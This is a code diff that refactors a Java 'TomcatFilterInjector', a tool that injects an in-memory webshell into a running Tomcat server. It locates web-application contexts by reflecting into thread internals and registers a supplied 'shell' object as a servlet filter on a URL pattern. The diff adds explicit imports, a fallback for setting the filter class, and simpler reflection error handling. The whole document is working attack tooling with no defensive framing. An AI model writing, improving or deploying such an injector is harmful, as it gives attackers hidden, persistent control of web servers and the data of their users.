@@ -6,7 +6,10 @@ import java.io.IOException;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
-import java.util.*;
+import java.util.ArrayList;
+import java.util.List;
+import java.util.Map;
+import java.util.Set;
 import java.util.zip.GZIPInputStream;
 
 /**
@@ -39,8 +42,8 @@ public class TomcatFilterInjector {
         try {
             List<Object> contexts = getContext();
             for (Object context : contexts) {
-                getShell(context);
-                inject(context);
+                Object shell = getShell(context);
+                inject(context, shell);
             }
         } catch (Exception e) {
             e.printStackTrace();
@@ -56,9 +59,9 @@ public class TomcatFilterInjector {
         Set<Thread> threads = Thread.getAllStackTraces().keySet();
         for (Thread thread : threads) {
             if (thread.getName().contains("ContainerBackgroundProcessor")) {
-                HashMap<?, ?> childrenMap = (HashMap<?, ?>) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
+                Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
                 for (Object value : childrenMap.values()) {
-                    HashMap<?, ?> children = (HashMap<?, ?>) getFieldValue(value, "children");
+                    Map<?, ?> children = (Map<?, ?>) getFieldValue(value, "children");
                     contexts.addAll(children.values());
                 }
             } else if (thread.getContextClassLoader() != null
@@ -70,7 +73,7 @@ public class TomcatFilterInjector {
         return contexts;
     }
 
-    private ClassLoader getWebAppClassLoader(Object context) {
+    private ClassLoader getWebAppClassLoader(Object context) throws Exception {
         try {
             return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
         } catch (Exception e) {
@@ -94,7 +97,7 @@ public class TomcatFilterInjector {
     }
 
     @SuppressWarnings("all")
-    public void inject(Object context) throws Exception {
+    public void inject(Object context, Object shell) throws Exception {
         if (invokeMethod(context, "findFilterDef", new Class[]{String.class}, new Object[]{getClassName()}) != null) {
             System.out.println("filter already injected");
             return;
@@ -113,10 +116,13 @@ public class TomcatFilterInjector {
         }
 
         invokeMethod(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{getClassName()});
-        invokeMethod(filterDef, "setFilterClass", new Class[]{String.class}, new Object[]{getClassName()});
+        try {
+            invokeMethod(filterDef, "setFilterClass", new Class[]{String.class}, new Object[]{getClassName()});
+        } catch (Exception e) {
+            invokeMethod(filterDef, "setFilterClass", new Class[]{Class.class}, new Object[]{shell.getClass()});
+        }
         invokeMethod(context, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});
         invokeMethod(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{getClassName()});
-        invokeMethod(filterMap, "setDispatcher", new Class[]{String.class}, new Object[]{"REQUEST"});
         Constructor<?>[] constructors;
         try {
             invokeMethod(filterMap, "addURLPattern", new Class[]{String.class}, new Object[]{getUrlPattern()});
@@ -174,30 +180,25 @@ public class TomcatFilterInjector {
     }
 
     @SuppressWarnings("all")
-    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) {
-        try {
-            Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
-            Method method = null;
-            while (clazz != null && method == null) {
-                try {
-                    if (paramClazz == null) {
-                        method = clazz.getDeclaredMethod(methodName);
-                    } else {
-                        method = clazz.getDeclaredMethod(methodName, paramClazz);
-                    }
-                } catch (NoSuchMethodException e) {
-                    clazz = clazz.getSuperclass();
+    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws Exception {
+        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
+        Method method = null;
+        while (clazz != null && method == null) {
+            try {
+                if (paramClazz == null) {
+                    method = clazz.getDeclaredMethod(methodName);
+                } else {
+                    method = clazz.getDeclaredMethod(methodName, paramClazz);
                 }
+            } catch (NoSuchMethodException e) {
+                clazz = clazz.getSuperclass();
             }
-            if (method == null) {
-                throw new NoSuchMethodException("Method not found: " + methodName);
-            }
-
-            method.setAccessible(true);
-            return method.invoke(obj instanceof Class ? null : obj, param);
-        } catch (Exception e) {
-            throw new RuntimeException("Error invoking method: " + methodName, e);
         }
+        if (method == null) {
+            throw new NoSuchMethodException("Method not found: " + methodName);
+        }
+        method.setAccessible(true);
+        return method.invoke(obj instanceof Class ? null : obj, param);
     }
 
     @SuppressWarnings("all")
